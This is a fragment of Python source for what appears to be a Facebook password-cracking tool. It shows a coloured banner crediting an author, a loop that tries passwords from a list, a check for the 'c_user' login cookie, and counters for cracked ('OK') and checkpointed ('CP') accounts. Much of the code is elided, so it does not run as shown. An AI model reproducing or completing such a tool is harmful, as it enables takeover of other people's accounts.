...
\n\x1b[1;92m   ADMIN : \x1b[1;97mANUM   \x1b[1;95mTOOL:\x1b[1;97mFREE     \x1b[1;91mV:\x1b[1;97m1.4.0
         ...
         \x1b[1;92m  WHATSAPP: \x1b[1;95m+923179504***
          \x1b[1;92m FACEBOOK:  \x1b[1;95mANUM MEMER
\033[1;37m------------------------\033[1;37m------------------------ """
def ud():
    
    print(logo)
    print('\TRY OKAY RANDOM NUMBER CRACKER OKAY')
    print('')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write('\r %s[ANUM] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
